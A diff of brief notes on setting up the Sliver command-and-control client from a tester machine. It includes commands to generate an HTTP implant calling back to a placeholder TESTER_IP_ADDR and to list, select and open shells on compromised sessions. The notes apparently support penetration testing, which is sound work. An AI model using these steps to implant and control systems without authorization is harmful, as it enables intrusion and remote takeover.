@@ -7,15 +7,17 @@ Configure (tester pc):
     sliver-client import /path/to/.cfg
     sliver-client [and choose tester host]
     
-    parameterize payload
-        https
-        generate --os x --name first --http TESTER_IP_ADDR
-        implants [view generated implants]
+parameterize payload
+    https
+    generate --os x --name first --http TESTER_IP_ADDR
+    implants [view generated implants]
 
-    useful things
-        jobs
-        --skip symbols [generate without obfuscation]
-        sessions [list open sessions]
-        use xx [first 2 of session ID]
-        info
-        shell
+Execution
+    use xx [first 2 of session ID]
+
+useful things
+    jobs
+    --skip symbols [generate without obfuscation]
+    sessions [list open sessions]
+    info
+    shell
